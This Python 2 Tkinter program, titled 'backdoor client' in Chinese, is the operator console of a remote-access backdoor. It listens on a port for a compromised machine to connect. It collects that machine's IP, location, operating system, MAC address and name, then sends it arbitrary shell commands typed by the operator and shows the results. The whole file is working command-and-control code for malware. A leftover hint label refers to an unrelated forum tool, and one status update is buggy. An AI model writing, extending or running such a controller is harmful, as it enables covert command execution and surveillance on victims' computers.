# coding:utf-8
from tkinter import *
from ttk import Treeview
import socket
from texttable import *
import threading
import time


class Server(Frame):
    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.pack()
        self.createWidgets()
        self.table = Texttable()
        self.thread_flag = True  # 线程控制

    def createWidgets(self):
        # 动态显示内容的默认值
        self.port_var = StringVar(self, '8998')
        self.cmd_var = StringVar(self, 'ls')
        self.info_var = StringVar(self, u'')
        self.hint_var = StringVar(self, u'不要多开该程序，需要重新抢楼的话请终止抢楼先。\n有问题就联系金成强。不要提奇奇怪怪的需求！\n')

        # 下方红色提示标签
        self.hint_label = Label(self)
        self.hint_label['textvariable'] = self.hint_var
        self.hint_label.pack()

        # 主机信息标签
        self.username_label = Label(self)
        self.username_label['text'] = u'主机信息'
        self.username_label.pack()

        # 主机信息表
        self.tree = Treeview(self, columns=['i', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h'], show='headings', height=1)
        # 内容居中
        self.tree.column("i", width=150, anchor="center")
        self.tree.column("a", width=150, anchor="center")
        self.tree.column("b", width=100, anchor="center")
        self.tree.column("c", width=100, anchor="center")
        self.tree.column("d", width=150, anchor="center")
        self.tree.column("e", width=80, anchor="center")
        self.tree.column("f", width=100, anchor="center")
        self.tree.column("g", width=120, anchor="center")
        self.tree.column("h", width=100, anchor="center")
        # 内容标题
        self.tree.heading('i', text='ID')
        self.tree.heading('a', text='IP')
        self.tree.heading('b', text='Country')
        self.tree.heading('c', text='City')
        self.tree.heading('d', text='Geography')
        self.tree.heading('e', text='System')
        self.tree.heading('f', text='MAC')
        self.tree.heading('g', text='Name')
        self.tree.heading('h', text='Status')
        self.tree.pack()

        # 端口标签
        self.username_label = Label(self)
        self.username_label['text'] = u'端口号'
        self.username_label.pack()

        # 端口输入框
        self.port_entry = Entry(self)
        self.port_entry['textvariable'] = self.port_var
        self.port_entry.pack()

        # CMD命令标签
        self.cmd_label = Label(self)
        self.cmd_label['text'] = u'CMD命令'
        self.cmd_label.pack()

        # CMD命令输入框
        self.cmd_entry = Entry(self)
        self.cmd_entry['textvariable'] = self.cmd_var
        self.cmd_entry.pack()

        # 历史记录标签
        self.con_label = Label(self)
        self.con_label['text'] = u'历史记录'
        self.con_label.pack()

        # 历史记录文本区
        self.con_text = Text(self)
        self.con_text['height'] = 10
        self.con_text['width'] = 50
        self.con_text.insert(END, '历史记录\n')
        self.con_text['state'] = 'disable'
        self.con_text.pack()

        # 监听按钮
        self.botton1 = Button(self)
        self.botton1['text'] = u'开始监听'
        self.botton1['command'] = self.thread_control
        self.botton1.pack()

        # 停止按钮
        self.botton2 = Button(self)
        self.botton2['text'] = u'停止监听'
        self.botton2['command'] = self.quit_server
        self.botton2.pack()

        # 发送按钮
        self.botton3 = Button(self)
        self.botton3['text'] = u'发送命令'
        self.botton3['command'] = self.send_msg
        self.botton3.pack()

        # 下方提示标签
        self.info_label = Label(self)
        self.info_label['textvariable'] = self.info_var
        self.info_label['bg'] = 'red'
        self.info_label.pack()

    def msg_handle(self):
        # 尝试建立连接
        build_flag = True
        while build_flag:
            try:
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.host = ''
                self.port = int(self.port_var.get().strip())
                self.s.bind((self.host, self.port))
                self.s.listen(10)
                build_flag = False
                self.info_var.set(u'服务开启成功')
            except:
                print Exception
                self.info_var.set(u'暂时不能开启服务，正在自动重启')
                time.sleep(2)

        self.name_list = []
        self.conn, self.addr = self.s.accept()
        # 第一次请求主机信息
        self.conn.send('000')
        #进入监听状态
        while 1:
            if self.thread_flag == False:
                break
            msg = self.conn.recv(1024)
            if msg != '':
                self.decode_msg(msg)

    # 发送接口
    def send_msg(self):
        cmd = self.cmd_var.get().strip()
        if cmd != '':
            self.conn.send(cmd)

    #对信息进行解码
    def decode_msg(self, msg):
        code = int(msg[0:3], 2)
        content = msg[3:]
        if code == 0:
            self.name_list.append(content)
            self.display_list()
            self.info_var.set = u'成功接收主机信息'
        if code == 1:
            self.con_text['state'] = 'normal'
            self.con_text.insert(END, content + '\n')
            self.con_text['state'] = 'disable'

    # 接收到主机信息后显示
    def display_list(self):
        name_list = self.name_list[-1].split(',')
        self.tree.insert('', 'end', values=name_list)

    #关闭socket
    def quit_server(self):
        self.thread_flag = False
        self.s.close()
        self.info_var.set(u'服务已经关闭')
        pass

    #打开监听线程
    def thread_control(self):
        self.thread_flag = True
        self.t = threading.Thread(target=self.msg_handle)
        self.t.setDaemon(True)
        self.t.start()


if __name__ == '__main__':
    root = Tk()
    root.title(u'后门客户端')
    # root.wm_attributes('-topmost', 1)
    root.geometry('1400x800+30+30')
    auto_man = Server(master=root)
    auto_man.mainloop()
